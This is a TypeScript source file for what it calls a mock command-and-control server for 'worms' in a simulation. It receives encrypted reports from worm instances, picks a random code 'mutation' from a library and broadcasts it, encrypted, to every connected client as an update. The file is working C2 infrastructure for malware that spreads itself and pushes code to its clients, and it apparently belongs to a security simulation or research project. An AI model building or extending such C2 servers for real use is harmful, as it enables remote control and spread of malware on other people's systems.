// Fix: Changed import to only use the default export of express.
// This allows using qualified types like `express.Request` to avoid conflicts with global DOM types.
import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { logger } from './utils/logger';
import { encrypt, decrypt } from './modules/crypto';
import { MUTATIONS } from './modules/mutations';

// Fix: Explicitly type `app` with the qualified `express.Express` type.
// This resolves overload errors on `app.use` by removing type ambiguity.
const app: express.Express = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
    cors: {
        origin: "*", // Allow all origins for this simulation
    }
});

const PORT = 4000;

app.use(express.json());

// Endpoint for worms to report failures
// Fix: Explicitly type handler parameters with qualified `express.Request` and `express.Response` types.
// This resolves errors where properties like `.body` or methods like `.status()` were not found due to type conflicts.
app.post('/api/report', (req: express.Request, res: express.Response) => {
    // Worms must provide their instance ID, encrypted log, and the key used for encryption.
    const { instanceId, payload, key } = req.body;
    
    if (!instanceId || !payload || !key) {
        logger.warn('C2 Server: Received invalid report (missing instanceId, payload, or key).');
        return res.status(400).send('Invalid report format');
    }

    try {
        const decryptedReport = decrypt(payload, key);
        if (!decryptedReport) {
            throw new Error('Decryption failed, payload may be malformed or key is incorrect.');
        }
        logger.info(`C2 Server: Received valid report from instance ${instanceId}: ${JSON.stringify(decryptedReport)}`);

        // This simulates the "tasking" part. Based on the report, we broadcast a mutation to all connected clients.
        // Select a random mutation from our library to broadcast.
        const selectedMutation = MUTATIONS[Math.floor(Math.random() * MUTATIONS.length)];
        
        logger.info(`C2 Server: Broadcasting mutation to all clients.`);
        
        // Encrypt the mutation code with the key the worm just provided.
        const encryptedCode = encrypt({ code: selectedMutation }, key);
        
        // Broadcast the encrypted payload and the key needed to decrypt it.
        io.emit('update', { payload: encryptedCode, key });

        res.status(200).json({ message: 'Report received and mutation broadcasted.' });

    } catch (e: any) {
        logger.error(`C2 Server: Failed to process report from ${instanceId}. Error: ${e.message}`);
        res.status(500).send('Error processing report.');
    }
});

io.on('connection', (socket) => {
    logger.info(`C2 Server: Client connected: ${socket.id}`);
    socket.on('disconnect', () => {
        logger.info(`C2 Server: Client disconnected: ${socket.id}`);
    });
});

httpServer.listen(PORT, () => {
    logger.info(`Mock C2 server is listening on http://localhost:${PORT}`);
});
